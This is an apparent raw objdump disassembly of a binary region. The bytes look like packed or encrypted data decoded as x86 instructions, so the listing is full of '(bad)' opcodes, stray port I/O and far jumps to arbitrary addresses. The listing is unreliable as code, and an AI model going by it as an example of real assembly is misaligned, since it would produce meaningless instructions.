  41f36d:	addr16 adc edi,esi
  41f370:	and    DWORD PTR [ecx],edi
  41f372:	cwde   
  41f373:	bound  eax,QWORD PTR [eax]
  41f375:	ins    BYTE PTR es:[edi],dx
  41f376:	adc    esi,ebx
  41f378:	lock adc al,BYTE PTR [ecx+0x70]
  41f37c:	outs   dx,WORD PTR ds:[esi]
  41f37e:	cs call 0xc1ca:0xc5d9c527
  41f386:	aas    
  41f387:	popf   
  41f388:	in     al,dx
  41f389:	daa    
  41f38a:	fisttp WORD PTR [edx]
  41f38c:	scas   eax,DWORD PTR es:[edi]
  41f38d:	mov    ds:0xd8f8ce14,al
  41f392:	rol    dl,cl
  41f394:	or     ecx,DWORD PTR [ebx-0x34]
  41f397:	iret   
  41f398:	sub    DWORD PTR [edx-0x23],eax
  41f39b:	sub    eax,0x3cf73a50
  41f3a0:	sbb    DWORD PTR [ebp-0x3f],ecx
  41f3a3:	cdq    
  41f3a4:	adc    BYTE PTR [esi+0x72],ah
  41f3a7:	jbe    0x41f40c
  41f3a9:	jnp    0x41f330
  41f3ab:	pop    esp
  41f3ac:	xor    ch,BYTE PTR [edi+edi*8+0x52]
  41f3b0:	es js  0x41f34c
  41f3b3:	adc    BYTE PTR [ecx-0x54],al
  41f3b6:	xchg   esi,eax
  41f3b7:	adc    eax,0x4d3ab4e0
  41f3bc:	pusha  
  41f3bd:	in     al,0x9a
  41f3bf:	ja     0x41f3bf
  41f3c1:	nop
  41f3c2:	cmp    ah,BYTE PTR [ebx]
  41f3c4:	sbb    eax,0x32e81f06
  41f3c9:	(bad)  
  41f3ca:	in     al,dx
  41f3cb:	mov    esi,eax
  41f3cd:	popf   
  41f3ce:	inc    ecx
  41f3cf:	cmp    BYTE PTR [ecx],bh
  41f3d1:	or     BYTE PTR [edi+0x5a],ch
  41f3d4:	retf   0x4963
  41f3d7:	repz in eax,dx
  41f3d9:	sbb    eax,0x36
  41f3dc:	inc    ebp
  41f3dd:	pop    esi
  41f3de:	out    0xf,al
  41f3e0:	imul   ecx,DWORD PTR [ebx+0x21],0x5a
  41f3e4:	sub    eax,0xcb832711
  41f3e9:	cmp    al,0xea
  41f3eb:	or     edx,ebx
  41f3ed:	test   DWORD PTR [eax],edi
  41f3ef:	sbb    eax,0xaa12040e
  41f3f4:	sbb    ebx,DWORD PTR [eax+0x2]
  41f3f7:	idiv   DWORD PTR [eax-0x3229ccff]
  41f3fd:	imul   ebx,DWORD PTR [esi-0x47835fc9],0x76f87027
  41f407:	sti    
  41f408:	mov    ah,0x37
  41f40a:	dec    esi
  41f40b:	(bad)  
  41f40c:	adc    bl,BYTE PTR [ecx+0x30]
  41f40f:	call   0x0:0xe5
	...
  41f472:	add    BYTE PTR [eax],al
  41f474:	cmp    al,0xe7
  41f476:	imul   ebp,edi,0xfffffffb
  41f479:	out    dx,eax
  41f47a:	mov    esp,0xd5fd13f7
  41f47f:	mov    ch,0x44
  41f481:	lods   al,BYTE PTR fs:[esi]
  41f483:	adc    edi,DWORD PTR [ecx]
  41f485:	dec    ebp
  41f486:	add    DWORD PTR [eax],eax
  41f488:	add    eax,0xf2000001
  41f48d:	mov    esi,0x5d75767c
  41f492:	mov    esi,0x6c0537fb
  41f497:	sub    DWORD PTR [esi+0x55afe4ef],ebp
  41f49d:	jp     0x41f43a
  41f49f:	gs lahf 
  41f4a1:	das    
  41f4a2:	pop    edi
  41f4a3:	jno    0x41f4b3
  41f4a5:	iret   
  41f4a6:	data16 stos BYTE PTR es:[edi],al
  41f4a8:	xor    dl,dl
  41f4aa:	pushf  
  41f4ab:	retf   0xebcd
  41f4ae:	rcr    BYTE PTR [ebx],cl
  41f4b0:	mov    edi,esi
  41f4b2:	jb     0x41f4d9
  41f4b4:	xor    DWORD PTR [esi+edx*1-0x550baae6],esi
  41f4bb:	cwde   
  41f4bc:	xor    BYTE PTR [esi+edi*1+0x25],0x85
  41f4c1:	sub    cl,bl
  41f4c3:	mov    bh,BYTE PTR [esi+0x68]
  41f4c6:	js     0x41f473
  41f4c8:	bound  edi,QWORD PTR [edx-0x7fbe8da6]
  41f4ce:	xchg   esp,eax
  41f4cf:	mov    eax,ds:0x3aee9e49
  41f4d4:	inc    eax
  41f4d5:	mov    ebp,DWORD PTR [ecx+0x2180d98]
  41f4db:	jnp    0x41f470
  41f4dd:	(bad)  
  41f4de:	in     al,0x85
  41f4e0:	adc    al,0xa7
  41f4e2:	stos   DWORD PTR es:[edi],eax
  41f4e3:	dec    edi
  41f4e4:	jl     0x41f4cf
  41f4e6:	inc    eax
  41f4e7:	mov    ecx,0x776e5928
  41f4ec:	aam    0x52
  41f4ee:	int3   
  41f4ef:	jo     0x41f55a
  41f4f1:	sahf   
  41f4f2:	push   ds
  41f4f3:	test   eax,0xdaf0ecf6
  41f4f8:	lods   al,BYTE PTR ds:[esi]
  41f4f9:	xor    al,0x5b
  41f4fb:	sahf   
  41f4fc:	mov    ecx,0x45a6e618
  41f501:	fwait
  41f502:	addr16 test eax,0xd3f96d49
  41f508:	and    esi,DWORD PTR [ebx-0x64]
  41f50b:	int    0x66
  41f50d:	push   esi
  41f50e:	ror    BYTE PTR [ecx-0x2f],1
  41f511:	mov    dl,0x8b
  41f513:	jp     0x41f4ac
  41f515:	pop    es
  41f516:	sub    eax,0xed846305
  41f51b:	out    dx,al
  41f51c:	call   0x124d:0x49812e6d
  41f523:	dec    edi
  41f524:	(bad)  
  41f525:	aas    
  41f526:	mov    cl,0x2e
  41f528:	into   
  41f529:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f52a:	dec    eax
  41f52b:	mov    eax,0xd5fc1409
  41f530:	pop    ebx
  41f531:	das    
  41f532:	mov    cl,dh
  41f534:	add    eax,eax
  41f536:	ror    DWORD PTR [esi+0xc],1
  41f539:	into   
  41f53a:	inc    eax
  41f53b:	xor    BYTE PTR [edx+0xb1c1a07],dl
  41f541:	mov    edi,0x18492d64
  41f546:	pop    esi
  41f547:	xchg   BYTE PTR [ebx-0x62],dl
  41f54a:	mov    ch,0x4d
  41f54c:	jle    0x41f517
  41f54e:	and    al,0x22
  41f550:	iret   
  41f551:	js     0x41f591
  41f553:	mov    dl,0x17
  41f555:	inc    DWORD PTR [edi-0xf]
  41f558:	aas    
  41f559:	xor    ch,BYTE PTR ds:0x44e0c823
  41f55f:	addr16 xchg ebp,eax
  41f561:	adc    eax,0xe255da03
  41f566:	or     al,0xe5
  41f568:	mov    al,0x7e
  41f56a:	fwait
  41f56b:	cmp    eax,0x2bdc866a
  41f570:	lods   al,BYTE PTR ds:[esi]
  41f571:	pop    ebp
  41f572:	mov    al,ds:0x37494a1
  41f577:	call   0x7273:0x180440dd
  41f57e:	daa    
  41f57f:	in     al,0xca
  41f581:	out    0x20,al
  41f583:	xor    BYTE PTR [edi+0x1e],dh
  41f586:	lahf   
  41f587:	out    dx,eax
  41f588:	fwait
  41f589:	leave  
  41f58a:	xchg   edi,eax
  41f58b:	(bad)  
  41f58c:	dec    ebp
  41f58d:	(bad)
  41f590:	or     BYTE PTR [eax],al
	...
  41f5f2:	add    BYTE PTR [eax],al
  41f5f4:	js     0x41f62a
  41f5f6:	add    bh,bl
  41f5f8:	dec    esi
  41f5f9:	(bad)  
  41f5fa:	stc    
  41f5fb:	mov    bh,0xb7
  41f5fd:	jmp    0xd63d:0x4de0d422
  41f604:	ds dec esi
  41f606:	add    DWORD PTR [eax],eax
  41f608:	add    eax,0x61000001
  41f60d:	mov    ecx,edx
  41f60f:	(bad)  
  41f610:	fcomp  st(0)
  41f612:	sahf   
  41f613:	das    
  41f614:	stc    
  41f615:	jb     0x41f667
  41f617:	lar    ebx,WORD PTR cs:[ebp-0x5027830d]
  41f61f:	mov    edx,0x8a4d7d3f
  41f624:	std    
  41f625:	cmp    BYTE PTR [edx+0x4e22d01c],0x7c
  41f62c:	mov    ecx,0xc38619bf
  41f631:	call   0xe1db0f3f
  41f636:	dec    ebp
  41f637:	enter  0x7aba,0x3f
  41f63b:	adc    ecx,ecx
  41f63d:	fs int 0x10
  41f640:	mov    BYTE PTR [edx+ebx*4+0x7a],dl
  41f644:	mov    al,0x87
  41f646:	idiv   DWORD PTR [ebx+ebx*2+0x3cd7f0f2]
  41f64d:	in     eax,0x41
  41f64f:	lods   eax,DWORD PTR ds:[esi]
  41f650:	xlat   BYTE PTR ds:[ebx]
  41f651:	inc    ebx
  41f652:	mov    ebp,0x7c00cf70
  41f657:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f658:	mov    edx,0xf4e5dcde
  41f65d:	jmp    0x5e12:0xcb9cb3c8
  41f664:	mov    WORD PTR [edx-0x60],ds
  41f667:	ins    BYTE PTR es:[edi],dx
  41f668:	fs push cs
  41f66a:	stos   DWORD PTR es:[edi],eax
  41f66b:	adc    al,BYTE PTR [ecx+0x6b]
  41f66e:	repnz scas eax,DWORD PTR es:[edi]
  41f670:	mov    eax,0xe7198d0b
  41f675:	sbb    ecx,ebp
  41f677:	xor    DWORD PTR [ecx-0x5e603c32],ecx
  41f67d:	outs   dx,BYTE PTR ds:[esi]
  41f67e:	lds    eax,FWORD PTR [edx+esi*1+0x73]
  41f682:	add    eax,DWORD PTR [ecx-0x7f]
  41f685:	shl    bl,1
  41f687:	jge    0x41f6b2
  41f689:	or     eax,0x3c3183c1
  41f68e:	(bad)  
  41f68f:	sbb    DWORD PTR [ebx+0x340a0080],esp
  41f695:	push   ecx
  41f696:	cmp    BYTE PTR [edi+0x6a],0x3a
  41f69a:	inc    ebp
  41f69b:	ins    DWORD PTR es:[edi],dx
  41f69c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f69d:	jge    0x41f6b8
  41f69f:	jns    0x41f6ce
  41f6a1:	mov    bl,0x9c
  41f6a3:	xchg   ecx,eax
  41f6a4:	inc    ebx
  41f6a5:	pop    ss
  41f6a6:	mov    dl,0x88
  41f6a8:	dec    edx
  41f6a9:	and    BYTE PTR [eax+0x3433877e],dl
  41f6af:	addr16 push ebp
  41f6b1:	mov    ah,0x8d
  41f6b3:	inc    ebx
  41f6b4:	or     BYTE PTR [edi-0x4f630020],dl
  41f6ba:	xor    al,0xaa
  41f6bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f6bd:	iret   
  41f6be:	icebp  
  41f6bf:	sub    eax,DWORD PTR [ecx+0x59]
  41f6c2:	(bad)  
  41f6c3:	in     eax,0x54
  41f6c5:	cmp    BYTE PTR ds:0xa2508737,bh
  41f6cb:	jo     0x41f658
  41f6cd:	push   0x65
  41f6cf:	cld    
  41f6d0:	out    dx,eax
  41f6d1:	push   0x7c9b7374
  41f6d6:	inc    esi
  41f6d7:	ret    0x4b5c
  41f6da:	neg    DWORD PTR ds:0x9255b5dc
  41f6e0:	iret   
  41f6e1:	outs   dx,BYTE PTR ds:[esi]
  41f6e2:	jmp    0x7ac5:0x6b4143f5
  41f6e9:	fadd   DWORD PTR [eax]
  41f6eb:	call   FWORD PTR [esi-0x34]
  41f6ee:	jge    0x41f673
  41f6f0:	shr    BYTE PTR [esi+0x60],1
  41f6f3:	arpl   WORD PTR [ebx-0x18],bp
  41f6f6:	dec    esi
  41f6f7:	pop    ebp
  41f6f8:	(bad)  
  41f6f9:	mov    ch,0x19
  41f6fb:	and    dl,BYTE PTR [edx]
  41f6fd:	enter  0xe17e,0x61
  41f701:	dec    edi
  41f702:	sub    edx,edx
  41f704:	and    DWORD PTR [ecx+ebp*8+0x1d],edi
  41f708:	pop    esp
  41f709:	in     al,dx
  41f70a:	cmp    DWORD PTR [esp+ecx*4+0x51],edx
  41f70e:	ins    DWORD PTR es:[edi],dx
  41f70f:	outs   dx,BYTE PTR ds:[esi]
  41f710:	ins    DWORD PTR es:[edi],dx
	...
  41f771:	add    BYTE PTR [eax],al
  41f773:	add    BYTE PTR [edx-0x5081dcc4],dl
  41f779:	jg     0x41f75a
  41f77b:	cld    
  41f77c:	call   0xeb42:0xcb6c62d2
  41f783:	fild   WORD PTR [ebx+0x4f]
  41f786:	add    DWORD PTR [eax],eax
  41f788:	add    eax,0xc5000001
  41f78d:	jb     0x41f774
  41f78f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f790:	mov    ah,0x92
  41f792:	out    0x13,eax
  41f794:	pop    esi
  41f795:	cmp    eax,0x96b954b
  41f79a:	sub    al,0x43
  41f79c:	(bad)  
  41f79d:	stos   DWORD PTR es:[edi],eax
  41f79e:	mov    BYTE PTR [ecx],bh
  41f7a0:	xchg   ecx,eax
  41f7a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f7a2:	cmc    
  41f7a3:	push   ss
  41f7a4:	sbb    al,ch
  41f7a6:	cmp    eax,0x4ef4c928
  41f7ab:	bound  esp,QWORD PTR [edi-0xc]
  41f7ae:	repnz adc al,0x19
  41f7b1:	or     eax,0xbf922b1c
  41f7b6:	sbb    eax,0xd9be52bf
  41f7bb:	jbe    0x41f7e8
  41f7bd:	mov    eax,0x92d4e2e4
  41f7c2:	out    dx,al
  41f7c3:	fisub  WORD PTR [edx+ebp*4]
  41f7c6:	jmp    0xad63:0xf3ed2df2
  41f7cd:	sahf   
  41f7ce:	popf   
  41f7cf:	ins    DWORD PTR es:[edi],dx
  41f7d0:	ss sbb al,0x86
  41f7d3:	fnsave [ecx+0x27a10063]
  41f7d9:	mov    ch,bl
  41f7db:	out    0x3b,al
  41f7dd:	mov    ah,0xb0
  41f7df:	(bad)  
  41f7e1:	add    al,0xee
  41f7e3:	sbb    edx,esp
  41f7e5:	sub    eax,0xc143f6ef
  41f7ea:	cmp    BYTE PTR [ecx+0x1fc6424b],0x3c
  41f7f1:	jnp    0x41f83f
  41f7f3:	pushf  
  41f7f4:	sub    DWORD PTR [esi+edx*2],edi
  41f7f7:	mov    gs,WORD PTR [ecx]
  41f7f9:	push   cs
  41f7fa:	not    DWORD PTR [ebp-0x30e9b7c1]
  41f800:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f801:	inc    edi
  41f802:	int3   
  41f803:	dec    esp
  41f804:	retf   0xa497
  41f807:	fisttp DWORD PTR [eax+0x6a78e2c2]
  41f80d:	mov    eax,ds:0xbcc4dbc0
  41f812:	mov    edx,0x6c166d15
  41f817:	rol    BYTE PTR [ebx+0x27e66d34],0xcb
  41f81e:	xchg   esi,eax
  41f81f:	jns    0x41f89a
  41f821:	pop    eax
  41f822:	ss enter 0xc6c9,0xa6
  41f827:	or     ah,BYTE PTR [ebx+0x2086d7a4]
  41f82d:	nop
  41f82e:	cmp    DWORD PTR [ebx-0x30511d4f],edi
  41f834:	aas    
  41f835:	mov    ah,0x95
  41f837:	ss mov ebx,0x75786941
  41f83d:	jle    0x41f7f8
  41f83f:	mov    bh,0x66
  41f841:	and    bl,dh
  41f843:	xchg   edx,eax
  41f844:	ret    0xac3e
  41f847:	sbb    al,0x1b
  41f849:	mov    dh,0xb1
  41f84b:	jg     0x41f8a1
  41f84d:	retf   
  41f84e:	push   ebp
  41f84f:	pop    edi
  41f850:	sbb    al,0xcd
  41f852:	cmp    DWORD PTR [ebp+0x37d9e1d4],ebx
  41f858:	ja     0x41f7f1
  41f85a:	mov    bh,0x5a
  41f85c:	push   ecx
  41f85d:	push   ds
  41f85e:	lea    esp,[edx+ecx*8-0xaa97a47]
  41f865:	call   0x5389:0x92a43f28
  41f86c:	adc    al,0xd3
  41f86e:	arpl   WORD PTR [ecx-0x13e66cd3],bx
  41f874:	aam    0x50
  41f876:	mov    BYTE PTR [eax],bl
  41f878:	out    0x3e,eax
  41f87a:	jbe    0x41f8ef
  41f87c:	inc    ecx
  41f87d:	adc    dh,BYTE PTR [ebx-0x71]
  41f880:	mov    WORD PTR [eax],?
  41f882:	mov    ebp,0x5ba9719d
  41f887:	lds    edx,FWORD PTR [edx+0x4f]
  41f88a:	jecxz  0x41f85d
  41f88c:	or     dh,BYTE PTR [eax+0x298ee9]
	...
  41f8f2:	add    BYTE PTR [eax],al
  41f8f4:	mov    eax,ds:0x3b920b9a
  41f8f9:	xchg   ebx,eax
  41f8fa:	mov    ecx,0x4183febb
  41f8ff:	pop    edx
  41f900:	jecxz  0x41f97a
  41f902:	cdq    
  41f903:	das    
  41f904:	dec    eax
  41f905:	push   eax
  41f906:	add    DWORD PTR [eax],eax
  41f908:	add    eax,0x9f000001
  41f90d:	imul   ebp,esp,0xbc0f6913
  41f913:	dec    edx
  41f914:	rol    BYTE PTR [ebx+0x31fd95d2],1
  41f91a:	std    
  41f91b:	popa   
  41f91c:	inc    esp
  41f91d:	sub    bh,BYTE PTR [esi+edi*4-0x25]
  41f921:	mov    bl,0x8f
  41f923:	adc    edx,DWORD PTR [ebx+0x63cfb6a8]
  41f929:	punpcklbw mm1,DWORD PTR cs:[ebx-0x1ff090bb]
  41f931:	mov    ecx,0x79a536e0
  41f936:	sti    
  41f937:	inc    edi
  41f938:	sub    ah,BYTE PTR [ebp+0x694e38ae]
  41f93e:	popf   
  41f93f:	and    eax,0x4cb7922d
  41f944:	push   ds
  41f945:	enter  0xceaf,0x34
  41f949:	pusha  
  41f94a:	imul   eax,DWORD PTR [edx+0x43c96285],0x1d
  41f951:	add    bh,BYTE PTR [eax-0x72]
  41f954:	xor    eax,0xbd1bbd44
  41f959:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f95a:	inc    ebx
  41f95b:	imul   edi,DWORD PTR [ebp-0x2d],0x44afab9c
  41f962:	xchg   edi,eax
  41f963:	gs push ss
  41f965:	stc    
  41f966:	hlt    
  41f967:	push   es
  41f968:	mov    al,0x8b
  41f96a:	or     al,BYTE PTR ds:0x4f734e9c
  41f970:	icebp  
  41f971:	dec    esi
  41f972:	aas    
  41f973:	mov    al,0x60
  41f975:	mov    ds:0xa836f38a,al
  41f97a:	cmp    edx,DWORD PTR [ebp-0x59cd5b38]
  41f980:	inc    esi
  41f981:	inc    ecx
  41f982:	(bad)  
  41f983:	jmp    0x5125bee6
  41f988:	into   
  41f989:	ss mov edi,0x7752217a
  41f98f:	sbb    al,0xbf
  41f991:	inc    ebp
  41f992:	pop    eax
  41f993:	pop    ds
  41f994:	out    0x6e,al
  41f996:	xchg   edx,eax
  41f997:	jb     0x41f9b8
  41f999:	imul   esp,ecx,0x16
  41f99c:	xchg   BYTE PTR [ebx],ch
  41f99e:	test   BYTE PTR [esi-0x11ab2731],al
  41f9a4:	rol    BYTE PTR [ebx-0x16],0xe5
  41f9a8:	jmp    0x41f947
  41f9aa:	add    DWORD PTR [esi+0x498e58b7],ebp
  41f9b0:	sbb    BYTE PTR gs:[edx-0x326115e6],cl
  41f9b7:	jge    0x41f9e5
  41f9b9:	repnz aas 
  41f9bb:	sub    eax,0x8bc81636
  41f9c0:	outs   dx,BYTE PTR ds:[esi]
  41f9c1:	and    BYTE PTR [ecx],0x7f
  41f9c4:	and    DWORD PTR [ebx-0x14],edi
  41f9c7:	leave  
  41f9c8:	jbe    0x41f999
  41f9ca:	cmc    
  41f9cb:	dec    esi
  41f9cc:	icebp  
  41f9cd:	mov    DWORD PTR [esi],ebx
  41f9cf:	rcl    DWORD PTR [ecx],1
  41f9d1:	mov    ebx,0xe4ba62e8
  41f9d6:	cmp    bl,BYTE PTR [eax+0x67]
  41f9d9:	fidiv  WORD PTR [ebx*2+0x2e44110d]
  41f9e0:	test   DWORD PTR gs:[ebp+0x6ff9f34e],ecx
  41f9e7:	imul   ah
  41f9e9:	clc    
  41f9ea:	inc    esp
  41f9eb:	xchg   ebx,eax
  41f9ec:	shl    BYTE PTR [esi],1
  41f9ee:	jmp    0x41fa04
  41f9f0:	and    BYTE PTR [eax],bl
  41f9f2:	jno    0x41f9ca
  41f9f4:	imul   ebx,DWORD PTR [bp+si],0x8592419d
  41f9fb:	loope  0x41fa4b
  41f9fd:	stos   DWORD PTR es:[edi],eax
  41f9fe:	into   
  41f9ff:	pop    ebx
  41fa00:	mov    ch,0xa2
  41fa02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fa03:	push   es
  41fa04:	lock lahf 
  41fa06:	dec    ebx
  41fa07:	pop    eax
  41fa08:	adc    DWORD PTR [ebp-0x1226109b],0xffffffd9
  41fa0f:	nop
  41fa10:	and    eax,0x0
	...
  41fa71:	add    BYTE PTR [eax],al
  41fa73:	add    BYTE PTR [edx],cl
  41fa75:	inc    ecx
  41fa76:	mov    bh,0xa1
  41fa78:	push   edi
  41fa7a:	push   ds
  41fa7b:	jmp    0x41faa0
  41fa7d:	push   edi
  41fa7e:	mov    ds:0x29485c15,eax
  41fa83:	and    al,0x4d
  41fa85:	push   ecx
  41fa86:	add    DWORD PTR [eax],eax
  41fa88:	add    eax,0x1f000001
  41fa8d:	mov    dh,0x2c
  41fa8f:	stos   BYTE PTR es:[edi],al
  41fa90:	mov    gs,WORD PTR [edi-0x32]
  41fa93:	mov    al,0xaf
  41fa95:	cmp    bh,al
  41fa97:	mov    dh,0x28
  41fa99:	outs   dx,DWORD PTR ds:[esi]
  41fa9a:	adc    DWORD PTR [ecx+0x3dce4533],edi
  41faa0:	cdq    
  41faa1:	pushf  
  41faa2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41faa3:	fild   QWORD PTR [edx]
  41faa5:	aam    0x90
  41faa7:	cmp    esp,DWORD PTR [edx-0x13]
  41faaa:	ins    DWORD PTR es:[edi],dx
  41faab:	xchg   ebp,eax
  41faac:	pop    esi
  41faad:	idiv   BYTE PTR [ecx+0x69]
  41fab0:	xor    al,0x33
  41fab2:	mov    ah,0x4e
  41fab4:	jge    0x41faeb
  41fab6:	in     al,dx
  41fab7:	cmp    al,0x99
  41fab9:	psubusb mm1,QWORD PTR ds:0xc145e644
  41fac0:	xor    eax,0x2e343389
  41fac5:	xchg   edi,eax
  41fac6:	leave  
  41fac7:	sbb    al,0x84
  41fac9:	add    al,0x2e
  41facb:	inc    edi
  41facc:	stos   DWORD PTR es:[edi],eax
  41facd:	adc    BYTE PTR [ecx+0x34],ch
  41fad0:	dec    eax
  41fad1:	cmp    edi,ebx
  41fad3:	popa   
  41fad4:	add    ebx,DWORD PTR [esp+ecx*1+0x663c3fea]
  41fadb:	add    BYTE PTR [edi],bl
  41fadd:	jl     0x41fb12
  41fadf:	adc    esi,edx
  41fae1:	jg     0x41fadd
  41fae3:	int3   
  41fae4:	jmp    0xba21:0x4eee60d4
  41faeb:	sahf   
  41faec:	and    bl,BYTE PTR [ebx+ebp*1+0x2a361c47]
  41faf3:	fst    DWORD PTR [edx+0xa]
  41faf6:	fsub   st(4),st
  41faf8:	xchg   ebx,eax
  41faf9:	sbb    bl,BYTE PTR [ebx-0x161e842]
  41faff:	add    al,0xfb
  41fb01:	les    esi,FWORD PTR [ebx-0x73ec754f]
  41fb07:	cwde   
  41fb08:	enter  0x6f77,0x4a
  41fb0c:	add    dh,bh
  41fb0e:	jg     0x41fa9a
  41fb10:	adc    eax,0x5c59f197
  41fb15:	mov    ecx,0x981c5924
  41fb1a:	pop    es
  41fb1b:	sub    BYTE PTR [edi+0x5e35600a],dl
  41fb21:	fwait
  41fb22:	popf   
  41fb23:	push   edx
  41fb24:	jb     0x41fb35
  41fb26:	jle    0x41faf0
  41fb28:	push   edx
  41fb29:	add    edx,DWORD PTR [ecx]
  41fb2b:	inc    ecx
  41fb2c:	test   eax,0x386a1ac7
  41fb31:	dec    edi
  41fb32:	ror    BYTE PTR [edx],0xfe
  41fb35:	push   eax
  41fb36:	dec    edi
  41fb37:	jnp    0x41facf
  41fb39:	mov    dh,0x49
  41fb3b:	retf   
  41fb3c:	add    ah,dl
  41fb3e:	rcl    BYTE PTR [esi-0x723f67ea],cl
  41fb44:	imul   eax,DWORD PTR [edx-0x3f],0xd19c4194
  41fb4b:	and    eax,0x4c2f2898
  41fb50:	inc    esp
  41fb51:	mov    ebp,0x29e6df1a
  41fb56:	xchg   ebx,eax
  41fb57:	sub    esi,DWORD PTR [ecx+0x0]
  41fb5a:	inc    ecx
  41fb5b:	dec    eax
  41fb5c:	add    BYTE PTR [ebx-0x7ab348d0],bl
  41fb62:	arpl   WORD PTR gs:[ebx+0x375543bd],dx
  41fb69:	dec    ebx
  41fb6a:	inc    ebp
  41fb6b:	xchg   esp,eax
  41fb6c:	jo     0x41fb9e
  41fb6e:	add    BYTE PTR [ebx+esi*1],0x31
  41fb72:	inc    esi
  41fb73:	fimul  WORD PTR [edx]
  41fb75:	shl    bh,1
  41fb77:	xor    cl,BYTE PTR [ebx+0x74]
  41fb7a:	les    edx,FWORD PTR [ebx]
  41fb7c:	icebp  
  41fb7d:	add    edx,edx
  41fb7f:	(bad)  
  41fb81:	loope  0x41fbba
  41fb83:	ins    DWORD PTR es:[edi],dx
  41fb84:	and    al,0x29
  41fb86:	cs dec esp
  41fb88:	cmc    
  41fb89:	outs   dx,BYTE PTR ds:[esi]
  41fb8a:	js     0x41fb17
  41fb8c:	imul   ebp,ebx,0x70
  41fb8f:	ss loop 0x41fb92
	...
  41fbf2:	add    BYTE PTR [eax],al
  41fbf4:	fsubr  QWORD PTR [eax]
  41fbf6:	mov    ah,ah
  41fbf8:	(bad)  
  41fbf9:	out    0xfe,al
  41fbfb:	cmp    BYTE PTR [esi],ah
  41fbfd:	ret    
  41fbfe:	or     DWORD PTR [esi],edx
  41fc00:	(bad)  
  41fc01:	or     esp,DWORD PTR [ecx-0x14]
  41fc04:	push   edx
  41fc05:	push   edx
  41fc06:	add    DWORD PTR [eax],eax
  41fc08:	add    eax,0xbc000001
  41fc0d:	inc    esp
  41fc0e:	cmp    BYTE PTR [esi-0x5b],ah
  41fc11:	call   0x7964fa50
  41fc16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fc17:	jnp    0x41fbf0
  41fc19:	jp     0x41fbc6
  41fc1b:	push   edx
  41fc1c:	pop    ss
  41fc1d:	fidiv  WORD PTR [edx+0xd379b96]
  41fc23:	xchg   esp,eax
  41fc24:	ds xchg ecx,eax
  41fc26:	adc    eax,DWORD PTR [ecx+0x3a]
  41fc29:	sub    ecx,edi
  41fc2b:	xor    DWORD PTR [ebx],esi
  41fc2d:	jl     0x41fc1b
  41fc2f:	sti    
  41fc30:	fadd   QWORD PTR [edi+0x6e]
  41fc33:	je     0x41fcaf
  41fc35:	and    DWORD PTR [esi],eax
  41fc37:	inc    ecx
  41fc38:	jb     0x41fbbe
  41fc3a:	ds push ss
  41fc3c:	sub    DWORD PTR [edx-0x75],ecx
  41fc3f:	push   ds
  41fc40:	push   eax
  41fc41:	mov    edx,0x2a29b0f
  41fc46:	retf   0x8f13
  41fc49:	mov    bl,0x48
  41fc4b:	scas   eax,DWORD PTR es:[edi]
  41fc4c:	sub    ebp,eax
  41fc4e:	bound  ebp,QWORD PTR [esi-0x1d]
  41fc51:	and    DWORD PTR [edi],ecx
  41fc53:	in     eax,dx
  41fc54:	aad    0x18
  41fc56:	fmul   QWORD PTR [edx]
  41fc58:	clc    
  41fc59:	sbb    ebp,0xac621444
  41fc5f:	add    al,0xe6
  41fc61:	addr16 or eax,0x33180467
  41fc67:	add    DWORD PTR ds:0x623c3658,ebx
  41fc6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fc6e:	out    0xa3,al
  41fc70:	xchg   esi,eax
  41fc71:	mov    esi,fs
  41fc73:	ret    
  41fc74:	cmp    DWORD PTR [edx+0x2bc21a98],esp
  41fc7a:	(bad)  
  41fc7b:	mov    esp,DWORD PTR [ecx-0x40]
  41fc7e:	lahf   
  41fc7f:	loopne 0x41fc4b
  41fc81:	jno    0x41fc5d
  41fc83:	sbb    al,0x5
  41fc85:	fwait
  41fc86:	aam    0x1f
  41fc88:	dec    esp
  41fc89:	xchg   edi,eax
  41fc8a:	adc    DWORD PTR [edi-0x278d817e],eax
  41fc90:	sbb    al,0x6b
  41fc92:	fadd   st(5),st
  41fc94:	sub    edx,DWORD PTR [edi+0x6e429ea6]
  41fc9a:	xchg   DWORD PTR [esi+0x67],esp
  41fc9d:	mov    fs,ecx
  41fc9f:	pop    ds
  41fca0:	cmp    BYTE PTR [eax-0x698f3739],al
  41fca6:	sbb    ebx,DWORD PTR [esi-0x2fe2eb95]
  41fcac:	lahf   
  41fcad:	scas   al,BYTE PTR es:[edi]
  41fcae:	dec    ebx
  41fcaf:	mov    WORD PTR [esi-0x13],cs
  41fcb2:	inc    edi
  41fcb3:	jno    0x41fcea
  41fcb5:	lods   eax,DWORD PTR ds:[esi]
  41fcb6:	pop    ecx
  41fcb7:	pop    ebp
  41fcb8:	loope  0x41fc62
  41fcba:	outs   dx,BYTE PTR ds:[esi]
  41fcbb:	cs push ds
  41fcbd:	or     ah,bh
  41fcbf:	push   ds
  41fcc0:	inc    eax
  41fcc1:	leave  
  41fcc2:	fmul   DWORD PTR [esi+0xc57cf77]
  41fcc8:	add    bl,BYTE PTR [ecx-0x22]
  41fccb:	stos   BYTE PTR es:[edi],al
  41fccc:	mov    eax,0xdcd410e
  41fcd1:	ins    BYTE PTR es:[edi],dx
  41fcd2:	fcom   DWORD PTR [edi+0x3e0e9cfd]
  41fcd8:	fst    DWORD PTR [esi-0x67]
  41fcdb:	sbb    DWORD PTR [ecx],esp
  41fcdd:	(bad)  
  41fcde:	retf   0x3995
  41fce1:	sub    bl,bh
  41fce3:	(bad)  
  41fce4:	in     eax,dx
  41fce5:	(bad)  
  41fce6:	push   ebp
  41fce7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fce8:	rol    BYTE PTR [eax+0x525ded51],1
  41fcee:	mov    dh,0xed
  41fcf0:	in     eax,0x5
  41fcf2:	adc    BYTE PTR [ebx],ch
  41fcf4:	mov    ?,ebp
  41fcf6:	jo     0x41fcf4
